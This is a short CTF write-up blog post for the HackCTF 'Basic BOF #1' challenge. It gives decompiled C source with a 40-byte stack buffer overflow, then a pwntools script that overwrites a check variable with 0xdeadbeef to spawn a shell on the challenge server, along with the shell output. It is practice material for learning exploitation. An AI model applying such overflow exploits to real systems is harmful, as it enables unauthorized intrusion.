---
layout: post
title: "HackCTF Basic BOF #1"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-03-31 17:00
tag: [WriteUp, HackCTF, Pwnable]
---


# Basic BOF #1

## Source

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [esp+4h] [ebp-34h]
  int v5; // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
    puts("Shell closed! Bye.");
  }
  return 0;
}
```

## Solve

```c
from pwn import *

e = ELF("./bof_basic")
#p = process("./bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3000)

payload = ''
payload += "A"*40
payload += p32(0xdeadbeef)

r.sendline(payload)
r.interactive()
```

```c
➜  hackctf python bof_basic.py
[*] '/home/ubuntu/ctf/hackctf/bof_basic'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to ctf.j0n9hyun.xyz on port 3000: Done
[*] Switching to interactive mode
$ id
uid=1000(attack) gid=1000(attack) groups=1000(attack)
```